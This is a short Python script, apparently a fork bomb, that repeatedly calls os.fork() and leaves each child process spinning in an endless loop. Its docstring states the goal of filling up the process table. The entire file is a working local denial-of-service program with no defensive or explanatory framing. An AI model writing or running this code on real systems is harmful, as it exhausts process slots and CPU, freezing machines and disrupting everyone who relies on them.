import os
import signal
import time

def spawn_processes():
    """
    Spawns a large number of child processes to fill up the process table.
    """
    try:
        while True:
            # Fork a new process
            pid = os.fork()
            if pid > 0:
                # Parent process: continue spawning
                continue
            elif pid == 0:
                # Child process: perform an infinite loop
                while True:
                    pass
            else:
                # Fork failed
                break
    except OSError as e:
        print(f"OSError: {e}")

if __name__ == "__main__":
    # Start spawning processes
    spawn_processes()